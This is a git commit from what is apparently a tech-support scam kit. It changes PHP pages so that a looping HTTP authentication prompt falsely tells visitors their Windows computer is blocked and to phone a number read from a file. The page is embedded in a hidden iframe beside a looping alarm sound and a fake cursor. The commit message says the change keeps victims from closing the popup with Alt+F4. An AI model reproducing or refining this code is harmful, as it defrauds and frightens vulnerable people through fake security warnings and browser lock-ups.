63fdbb2f20bd85ce69f7976ea493c99a0a33c51e
ori1337 <orikeshet1337@gmail.com>
2018-08-21 20:08:33 -0700

    Fix delay when the fakelogin popsup (doesnt allow you alt+f4)
    Also it were a delay in there
    so it fixed thanks to some stupid scammers

--- firefox/auth.php
+++ firefox/auth.php
@@ -1,3 +1,16 @@
 <?php
-header('WWW-Authenticate: Basic realm="Windows and computer has been blocked due to some suspicious activity, to get your computer secure call us immediately on our number: '.htmlspecialchars($_GET["num"]) .' "');
+$myfile = fopen("../number.txt", "r") or die("Unable to open file!");
+$phone = fgets($myfile);
+//
+$phone = trim(preg_replace('/\s\s+/', ' ', $phone));
+fclose($myfile);
+
+
+header('WWW-Authenticate: Basic realm="Windows and computer has been blocked due to some suspicious activity, to get your computer secure call us immediately on our number: '.$phone.' "');
+header('Location: auth.php');
+header('HTTP/1.0 401 Unauthorized');
+$page = $_SERVER['PHP_SELF'];
+$sec = "0";
+header("Refresh: $sec; url=$page");
+echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";
 ?>
--- firefox/index.php
+++ firefox/index.php
@@ -510,12 +510,12 @@
     <div class="clr"></div>
   </div>
 </div>
-<?php
-echo '"<iframe src="auth.php?num='.$phone.'" style="display:none;"></iframe>"'
-?>
 <audio autoplay loop>
   <source src="alert.mp3" type="audio/mpeg">
 </audio>
 <div class="fakeCursor"></div> 
+<?php
+echo '"<iframe src="auth.php" style="display:none;"></iframe>"'
+?>
     </body>
 <script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'a2plcpnl0609'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>
